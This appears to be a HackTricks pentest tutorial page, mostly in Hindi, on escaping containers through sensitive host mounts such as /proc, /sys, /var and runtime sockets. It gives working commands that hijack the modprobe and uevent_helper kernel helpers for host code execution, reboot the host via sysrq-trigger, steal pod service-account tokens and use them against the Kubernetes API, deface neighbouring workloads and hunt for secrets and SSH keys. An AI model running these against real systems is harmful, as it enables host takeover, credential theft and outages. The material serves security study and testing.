# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts container-escape की सबसे महत्वपूर्ण व्यावहारिक सतहों में से एक हैं क्योंकि ये अक्सर सावधानी से पृथक किए गए प्रोसेस के दृश्य को होस्ट संसाधनों की सीधे दृश्यता में बदल देते हैं। खतरनाक मामलों तक सीमा सिर्फ `/` तक सीमित नहीं है। `/proc`, `/sys`, `/var` के bind mounts, runtime sockets, kubelet-managed state, या device-related paths कर्नेल कंट्रोल्स, क्रेडेंशियल्स, पड़ोसी container फाइलसिस्टम और runtime management interfaces उजागर कर सकते हैं।

यह पेज अलग इसलिए है क्योंकि दुरुपयोग का मॉडल कई हिस्सों में फैला हुआ है। एक writable host mount आंशिक रूप से mount namespaces, आंशिक रूप से user namespaces, आंशिक रूप से AppArmor या SELinux कवरेज, और आंशिक रूप से उस विशेष host path पर निर्भर होता है जो एक्सपोज़ हुआ था। इसे एक अलग टॉपिक मानने से attack surface को समझना काफी आसान हो जाता है।

## `/proc` Exposure

procfs में सामान्य प्रोसेस जानकारी के साथ-साथ उच्च-प्रभाव वाले कर्नेल कंट्रोल इंटरफेस भी होते हैं। एक bind mount जैसे कि `-v /proc:/host/proc` या कोई container view जो अप्रत्याशित writable proc एंट्रीज़ को एक्सपोज़ करता है, इसलिए information disclosure, denial of service, या direct host code execution तक ले जा सकता है।

High-value procfs paths include:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

शुरुआत में यह जाँचें कि कौन सी high-value procfs एंट्रीज़ दिखाई दे रही हैं या writable हैं:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
ये पाथ्स विभिन्न कारणों से दिलचस्प हैं। `core_pattern`, `modprobe`, और `binfmt_misc` writable होने पर host पर code-execution पाथ बन सकते हैं। `kallsyms`, `kmsg`, `kcore`, और `config.gz` kernel exploitation के लिए शक्तिशाली reconnaissance स्रोत हैं। `sched_debug` और `mountinfo` process, cgroup, और filesystem context उजागर करते हैं जो container के अंदर से host का layout reconstruct करने में मदद कर सकते हैं।

प्रत्येक पाथ का व्यावहारिक महत्व अलग होता है, और इन्हें सभी को एक ही प्रभाव वाला मानकर triage मुश्किल हो जाता है:

- `/proc/sys/kernel/core_pattern`
यदि writable है, तो यह सबसे उच्च-प्रभाव वाले procfs paths में से एक है क्योंकि कर्नेल crash के बाद एक pipe handler execute करेगा। एक container जो `core_pattern` को अपने overlay में रखे payload या किसी mounted host path की तरफ पॉइंट कर सके, अक्सर host code execution प्राप्त कर सकता है। देखिए भी [read-only-paths.md](protections/read-only-paths.md) एक समर्पित उदाहरण के लिए।
- `/proc/sys/kernel/modprobe`
यह पाथ userspace helper को नियंत्रित करता है जो कर्नेल module-loading logic invoke करने पर उपयोग करता है। यदि यह container से writable हो और host context में interpret हो, तो यह एक और host code-execution primitive बन सकता है। यह विशेष रूप से दिलचस्प होता है जब इसे helper path trigger करने के किसी तरीके के साथ जोड़ा जाए।
- `/proc/sys/vm/panic_on_oom`
सामान्यत: यह एक साफ escape primitive नहीं है, लेकिन यह memory pressure को host-व्यापी denial of service में बदल सकता है, OOM conditions को कर्नेल panic व्यवहार में बदलकर।
- `/proc/sys/fs/binfmt_misc`
यदि registration interface writable है, तो attacker चुनी हुई magic value के लिए handler register कर सकता है और जब कोई matching file execute हो तो host-context execution प्राप्त कर सकता है।
- `/proc/config.gz`
kernel exploit triage के लिए उपयोगी है। यह यह पता लगाने में मदद करता है कि कौन से subsystems, mitigations, और optional kernel features enabled हैं, बिना host package metadata की आवश्यकता के।
- `/proc/sysrq-trigger`
ज्यादातर denial-of-service path है, लेकिन बहुत गंभीर। यह host को तुरंत reboot, panic, या अन्यथा बाधित कर सकता है।
- `/proc/kmsg`
kernel ring buffer messages को उजागर करता है। host fingerprinting, crash analysis के लिए उपयोगी है, और कुछ environments में kernel exploitation के लिए उपयोगी जानकारी leaking करने में भी मददगार हो सकता है।
- `/proc/kallsyms`
पढ़ने योग्य होने पर मूल्यवान है क्योंकि यह exported kernel symbol जानकारी दिखाता है और kernel exploit development के दौरान address randomization assumptions को मात देने में मदद कर सकता है।
- `/proc/[pid]/mem`
यह एक direct process-memory interface है। यदि target process आवश्यक ptrace-style conditions के साथ पहुँच योग्य है, तो यह किसी अन्य process की memory पढ़ने या modify करने की अनुमति दे सकता है। वास्तविक प्रभाव बहुत हद तक credentials, `hidepid`, Yama, और ptrace restrictions पर निर्भर करता है, इसलिए यह एक शक्तिशाली पर conditional path है।
- `/proc/kcore`
system memory का core-image-style view उजागर करता है। फ़ाइल बहुत बड़ी और उपयोग में असहज है, लेकिन यदि यह अर्थपूर्ण रूप से readable है तो यह एक badly exposed host memory surface का संकेत देता है।
- `/proc/kmem` और `/proc/mem`
ऐतिहासिक रूप से high-impact raw memory interfaces रहे हैं। कई आधुनिक सिस्टम पर ये disabled या कड़े रूप से restricted होते हैं, परंतु यदि मौजूद और usable हों तो इन्हें critical findings माना जाना चाहिए।
- `/proc/sched_debug`
leaks scheduling और task जानकारी जो host process identities को उजागर कर सकती है, भले ही अन्य process views अपेक्षा से साफ दिखें।
- `/proc/[pid]/mountinfo`
container वास्तव में host पर कहाँ स्थित है, कौन से paths overlay-backed हैं, और क्या कोई writable mount host content से संबंधित है या केवल container layer से — यह reconstruct करने के लिए बेहद उपयोगी है।

यदि `/proc/[pid]/mountinfo` या overlay विवरण पढ़ने योग्य हों, तो उनका उपयोग container filesystem का host path recover करने के लिए करें:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
ये कमांड्स उपयोगी हैं क्योंकि कई host-execution ट्रिक्स में कंटेनर के अंदर मौजूद पाथ को होस्ट के दृष्टिकोण से संबंधित समकक्ष पाथ में बदलना आवश्यक होता है।

### पूर्ण उदाहरण: `modprobe` Helper Path Abuse

यदि `/proc/sys/kernel/modprobe` कंटेनर से writable है और helper path को होस्ट संदर्भ में interpret किया जाता है, तो इसे एक attacker-controlled payload की ओर redirect किया जा सकता है:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
सटीक ट्रिगर लक्ष्य और kernel के व्यवहार पर निर्भर करता है, लेकिन महत्वपूर्ण बात यह है कि एक writable helper path भविष्य में kernel helper invocation को attacker-controlled host-path content की ओर redirect कर सकता है।

### पूरा उदाहरण: Kernel Recon के साथ `kallsyms`, `kmsg`, और `config.gz`

यदि लक्ष्य immediate escape की बजाय exploitability assessment है:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
ये commands यह पता लगाने में मदद करते हैं कि उपयोगी symbol information दिखाई दे रही है या नहीं, हाल के kernel messages कोई रोचक state उजागर करते हैं या नहीं, और कौन-कौन सी kernel features या mitigations compiled हैं। प्रभाव आमतौर पर प्रत्यक्ष escape नहीं होता, लेकिन यह kernel-vulnerability triage को नाटकीय रूप से छोटा कर सकता है।

### पूर्ण उदाहरण: SysRq Host Reboot

यदि `/proc/sysrq-trigger` writable है और host view तक पहुंचता है:
```bash
echo b > /proc/sysrq-trigger
```
प्रभाव तुरंत होस्ट रिबूट का होता है। यह कोई सूक्ष्म उदाहरण नहीं है, पर यह स्पष्ट रूप से दर्शाता है कि procfs एक्सपोज़र सूचना प्रकटीकरण की तुलना में कहीं अधिक गंभीर हो सकता है।

## `/sys` एक्सपोज़र

sysfs कर्नेल और डिवाइस स्थिति की बड़ी मात्रा प्रकाशित करता है। कुछ sysfs paths मुख्यतः fingerprinting के काम आते हैं, जबकि अन्य helper execution, device behavior, security-module कॉन्फ़िगरेशन, या firmware स्थिति को प्रभावित कर सकते हैं।

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

ये paths विभिन्न कारणों से महत्वपूर्ण हैं। `/sys/class/thermal` thermal-management व्यवहार को प्रभावित कर सकता है और इसलिए खराब तरीके से एक्सपोज़ किए गए वातावरण में होस्ट की स्थिरता को प्रभावित कर सकता है। `/sys/kernel/vmcoreinfo` crash-dump और kernel-layout जानकारी को leak कर सकता है, जो low-level host fingerprinting में मदद करती है। `/sys/kernel/security` वह `securityfs` इंटरफ़ेस है जिसे Linux Security Modules इस्तेमाल करते हैं, इसलिए वहाँ अनपेक्षित पहुँच MAC-related स्थिति को उजागर या बदल सकती है। EFI variable paths firmware-backed boot सेटिंग्स को प्रभावित कर सकती हैं, जिससे वे सामान्य configuration फ़ाइलों की तुलना में कहीं अधिक गंभीर हो जाते हैं। `debugfs` `/sys/kernel/debug` के अंतर्गत विशेष रूप से खतरनाक है क्योंकि यह जानबूझकर developer-oriented इंटरफ़ेस है जिसकी सुरक्षा अपेक्षाएँ hardened production-facing kernel APIs की तुलना में काफी कम हैं।

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:
- `/sys/kernel/security` यह दिखा सकता है कि AppArmor, SELinux, या कोई अन्य LSM सतह इस तरह दिखाई दे रही है जो केवल होस्ट तक सीमित रहनी चाहिए थी।
- `/sys/kernel/debug` अक्सर इस समूह में सबसे चिंताजनक खोज होती है। यदि `debugfs` माउंट है और पठनीय या लेखन-योग्य है, तो कर्नेल की ओर मुख़ातिब एक व्यापक सतह की उम्मीद रखें जिसकी सटीक जोखिम सक्षम debug nodes पर निर्भर करती है।
- EFI variable exposure कम सामान्य है, लेकिन यदि मौजूद है तो इसका प्रभाव बड़ा होता है क्योंकि यह सामान्य रनटाइम फाइलों के बजाय firmware-backed सेटिंग्स को छूता है।
- `/sys/class/thermal` मुख्यतः होस्ट स्थिरता और हार्डवेयर इंटरैक्शन से संबंधित है, न कि neat shell-style escape के लिए।
- `/sys/kernel/vmcoreinfo` मुख्यतः होस्ट-फिंगरप्रिंटिंग और क्रैश-एनालिसिस का स्रोत है, जो निचले स्तर के कर्नेल स्टेट को समझने में उपयोगी है।

### Full Example: `uevent_helper`
यदि `/sys/kernel/uevent_helper` लेखन-योग्य है, तो जब एक `uevent` ट्रिगर होता है, कर्नेल एक हमलावर-नियंत्रित हेल्पर को चला सकता है:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container.

## `/var` एक्सपोज़र

host के `/var` को container में mount करना अक्सर कम आंका जाता है क्योंकि यह `/` को mount करने जैसा नाटकीय नहीं दिखता। वास्तविकता में यह runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, और पड़ोसी application filesystems तक पहुँचने के लिए काफी हो सकता है। आधुनिक nodes पर, `/var` अक्सर वह जगह होता है जहाँ सबसे अधिक operationally रोचक container state वास्तव में रहती है।

### Kubernetes Example

A pod with `hostPath: /var` can often read other pods' projected tokens and overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
ये commands उपयोगी हैं क्योंकि ये बताती हैं कि mount केवल सामान्य application data उजागर करता है या high-impact cluster credentials भी। एक readable service-account token तुरंत local code execution को Kubernetes API access में बदल सकता है।

यदि token मौजूद है, तो token discovery पर ही रुकने के बजाय सत्यापित करें कि यह किन संसाधनों तक पहुँच सकता है:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
यहाँ प्रभाव स्थानीय node access से कहीं अधिक बड़ा हो सकता है। व्यापक RBAC वाले token एक mounted `/var` को क्लस्टर-व्यापी compromise में बदल सकते हैं।

### Docker और containerd उदाहरण

Docker होस्ट्स पर प्रासंगिक डेटा अक्सर `/var/lib/docker` के अंतर्गत होता है, जबकि containerd-backed Kubernetes नोड्स पर यह `/var/lib/containerd` या snapshotter-specific paths के तहत हो सकता है:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
यदि माउंट किया गया `/var` किसी अन्य workload के writable snapshot contents को एक्सपोज़ करता है, तो attacker बिना current container configuration को छुए application files में बदलाव कर सकता है, web content प्लांट कर सकता है, या startup scripts बदल सकता है।

एक बार writable snapshot content मिल जाने पर ठोस दुरुपयोग के विचार:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
यहाँ दिए गए कमांड उपयोगी हैं क्योंकि वे माउंट किए गए `/var` के तीन मुख्य प्रभाव परिवार दिखाते हैं: application tampering, secret recovery, और lateral movement into neighboring workloads।

## Runtime Sockets

Sensitive host mounts अक्सर full directories की बजाय runtime sockets शामिल करते हैं। ये इतने महत्वपूर्ण हैं कि इन्हें यहाँ विशेष रूप से दोहराया जाना चाहिए:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
जब इनमें से किसी एक socket को माउंट किया जाता है, तो पूर्ण exploitation flows के लिए [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) देखें।

एक त्वरित प्रारंभिक इंटरैक्शन पैटर्न के रूप में:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
यदि इनमें से कोई एक सफल हो जाता है, तो "mounted socket" से "start a more privileged sibling container" तक का रास्ता आमतौर पर किसी भी kernel breakout path की तुलना में बहुत छोटा होता है।

## Mount-संबंधी CVEs

Host mounts runtime vulnerabilities के साथ भी इंटरसेक्ट करते हैं। हाल के महत्वपूर्ण उदाहरण हैं:

- `CVE-2024-21626` in `runc`, जहां एक leaked directory file descriptor वर्किंग डायरेक्टरी को होस्ट फाइल सिस्टम पर रख सकता था।
- `CVE-2024-23651` और `CVE-2024-23653` in BuildKit, जहां OverlayFS copy-up races बिल्ड के दौरान host-path पर लिखने का कारण बन सकती थीं।
- `CVE-2024-1753` in Buildah और Podman build flows, जहां crafted bind mounts बिल्ड के दौरान `/` को read-write के लिए expose कर सकते थे।
- `CVE-2024-40635` in containerd, जहां एक बड़ा `User` मान UID 0 व्यवहार में overflow कर सकता था।

ये CVEs यहाँ महत्वपूर्ण हैं क्योंकि वे दिखाते हैं कि mount handling केवल operator configuration का मामला नहीं है। runtime स्वयं भी mount-driven escape conditions ला सकता है।

## जांच

इन कमांड्स का उपयोग करके सबसे उच्च-मूल्य वाले mount exposures जल्दी ढूँढें:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- Host root, `/proc`, `/sys`, `/var`, और runtime sockets सभी उच्च-प्राथमिकता की खोजें हैं।
- Writable proc/sys entries अक्सर यह दर्शाते हैं कि mount host-global kernel controls को एक्सपोज कर रहा है, न कि एक सुरक्षित container view।
- Mounted `/var` paths केवल filesystem समीक्षा तक सीमित नहीं हैं; इनके लिए credentials और neighboring-workload की समीक्षा भी आवश्यक है।
{{#include ../../../banners/hacktricks-training.md}}
